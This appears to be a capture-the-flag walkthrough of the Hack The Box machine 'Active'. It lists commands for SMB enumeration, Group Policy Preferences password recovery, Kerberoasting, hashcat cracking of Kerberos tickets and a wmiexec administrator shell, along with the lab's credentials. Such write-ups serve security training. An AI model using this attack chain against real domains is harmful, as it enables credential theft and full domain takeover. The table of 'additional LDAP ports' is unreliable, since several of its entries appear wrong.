# ACTIVE
--------------------------------------------------------------------
## Topics will be covered
- SMB enumeration techniques
- Group Policy Preferences enumeration and exploitation
- Identification and exploitation of Kerberoastable accounts

##  Enumeration and Exploiting tools:
```bash
    - Nmap
        ○ nmap -Pn -sV -sC  10.10.10.100
    - SMB
        ○ smbclient -L //10.10.10.100
        ○ smbmap -H 10.10.10.100
        ○ smbclient //10.10.10.100/Replication
    - Foothold (First successful breach/Limited access/Starting point)
        ○ Group Policy Preferences
    - Authenticated Enumeration
        ○ smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
        ○ smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
    - Privilege Escalation
        ○ ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
        ○ GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
    - Kerberoasting
        ○ ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
        ○ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
        ○ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
    - Cracking of Kerberos TGS Hash 
        ○ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable 
    - Shell as Primary Domain Admin 
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```
----------------------------------------------------------------------------------------------------------------------------------
### Namp
![alt text](image.png)
![alt text](image-1.png)
- 1. Understanding the SMB share ports 
| Port          | Protocol                                   |Service          | Description                                   |
|---------------|-------------------------------------------|---------------|-------------------------------------------|
|445         | SMB (Server Message Block)                | smb           | File sharing and printer sharing over a network |
|139         | NetBIOS Session Service                    | netbios-ssn  | Provides session services for NetBIOS over TCP/IP |
|135         | Remote Procedure Call (RPC)                | msrpc         | Used for remote procedure calls and DCOM services |
|137         | NetBIOS Name Service                      | netbios-ns    | Provides name services for NetBIOS over TCP/IP |
|138         | NetBIOS Datagram Service                  | netbios-dgm   | Provides datagram services for NetBIOS over UDP |
- Understanding the LDAP ports
Understanding the LDAP ports
| Port          | Protocol                                   |Service          | Description                                   |
|389         | Lightweight Directory Access Protocol (LDAP) | ldap          | Used for accessing and maintaining distributed directory information services |
|636         | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|3268        | Global Catalog (LDAP)                      | gc            | Provides a read-only replica of the Active Directory database for faster searches |
|3269        | Global Catalog over SSL (LDAPS)            | gc-ssl        | Secure version of the Global Catalog using SSL/TLS encryption |
- 2. Microsoft Active Directory-Specific Ports
| Port          | Protocol                                   |Service          | Description                                   |
|--------------|-------------------------------------------|---------------|-------------------------------------------|
|88           | Kerberos                                   | kerberos      | Authentication protocol used in Active Directory | 
|445         | SMB (Server Message Block)                | smb           | File sharing and printer sharing over a network |
|464         | Kerberos Password Change                   | kpasswd       | Used for changing Kerberos passwords |
|593         | Remote Procedure Call (RPC) over HTTP      | rpc-http      | Used for remote procedure calls over HTTP |
|636         | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|3268        | Global Catalog (LDAP)                      | gc            | Provides a read-only replica of the Active Directory database for faster searches |
|3269        | Global Catalog over SSL (LDAPS)            | gc-ssl        | Secure version of the Global Catalog using SSL/TLS encryption |
- 3. Additional LDAP-Related Ports
| Port          | Protocol                                   |Service          | Description                                   |
|--------------|-------------------------------------------|---------------|-------------------------------------------|
|689         | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|1758      | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|2003      | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|2004      | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|3535      | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
|3536      | LDAP over SSL (LDAPS)                      | ldaps         | Secure version of LDAP using SSL/TLS encryption |
- 4.  Ports Used in LDAP Attacks
- When performing penetration testing or security assessments, these ports are critical:

|Attack Type | Ports Used    |
|--------------|-------------------------------------------|
|LDAP Passwords Spraying| 389, 636 |
|LDAP Anonymous Binds | 389|
|LDAP Injection | 389, 636|
|Kerberoasting (via LDAP) | 88, 389|
|AD CS (Certificate Services) Attacks| 389, 636, 88|

- Now lets come back to the nmap results and found smb ports are availible(Port 445 is open)
- But guest user is not available but smb signing is happening
![alt text](image-2.png)
![alt text](image-3.png)
- So lets try smbclient with available shares and login with anonymous this time
```bash
smbclient -L //10.129.89.194 or \\active.htb
```
![alt text](image-4.png)
- Since anonymous login is allowed, we can view a list of available shares. 
- Let's now use smbmap to identify which of these shares are accessible with anonymous credentials.
![alt text](image-5.png)